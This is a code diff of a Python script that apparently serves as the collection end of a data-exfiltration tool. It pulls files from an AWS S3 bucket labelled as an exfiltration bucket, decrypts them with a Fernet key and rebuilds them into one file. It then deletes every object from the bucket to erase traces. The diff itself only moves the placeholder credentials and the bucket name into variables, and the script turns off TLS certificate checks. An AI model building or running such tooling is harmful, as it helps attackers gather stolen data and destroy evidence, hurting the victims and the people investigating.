@@ -4,7 +4,13 @@ import json
 import os
 import math
 from cryptography.fernet import Fernet
+
+
 key = b'<FERNET_KEY>'
+aws_access_key_id = '<AWS_ACCESS_KEY_ID>'
+aws_secret_access_key = '<AWS_SECRET_ACCESS_KEY_ID>'
+region = '<REGION>'
+exfiltration_bucket_name = '<EXFILTRATION_BUCKET_NAME>'
 
 #----------Enviroment Reset (Delete old files, etc)--------------
 if os.path.exists("reconstructedFile.txt"):
@@ -20,15 +26,15 @@ for file in os.listdir(folder):
 		os.unlink(file_path)
 
 #----------AWS Connection--------------
-session = boto3.session.Session(aws_access_key_id = '<AWS_ACCESS_KEY_ID>',
- 								aws_secret_access_key = '<AWS_SECRET_ACCESS_KEY_ID>',
- 								region_name = 'us-east-2')
+session = boto3.session.Session(aws_access_key_id = aws_access_key_id,
+ 								aws_secret_access_key = aws_secret_access_key,
+ 								region_name = region)
 aws_s3_client = session.client('s3', verify = False)
 aws_s3_resource = session.resource('s3', verify = False)
 
 #----------Here we get the all the fileNames in our bucket--------------
 list_response = aws_s3_client.list_objects(
-	Bucket = '<EXFILTRATION_BUCKET_NAME>',
+	Bucket = exfiltration_bucket_name,
 	Delimiter = '/exfiltrated_data'
 )
 list_response_contents = list_response['Contents']
@@ -56,7 +62,7 @@ for file in fileNames:
 for file in fileNames:
 	print(file)
 	name = file.replace('exfiltrated_data/','')
-	aws_s3_resource.meta.client.download_file('<EXFILTRATION_BUCKET_NAME>', file, 'downloadedFiles/'+name)
+	aws_s3_resource.meta.client.download_file(exfiltration_bucket_name, file, 'downloadedFiles/'+name)
 
 #----------We create a reconstruction file--------------
 with open('reconstructedFile.txt', 'a+') as finalFile:
@@ -79,6 +85,6 @@ with open('reconstructedFile.txt', 'a+') as finalFile:
 		file.close()
 
 #----------We delete all information from the bucket--------------
-bucket = aws_s3_resource.Bucket('<EXFILTRATION_BUCKET_NAME>')
+bucket = aws_s3_resource.Bucket(exfiltration_bucket_name)
 for file in fileNames:
-	aws_s3_resource.Object('<EXFILTRATION_BUCKET_NAME>', file).delete()
+	aws_s3_resource.Object(exfiltration_bucket_name, file).delete()
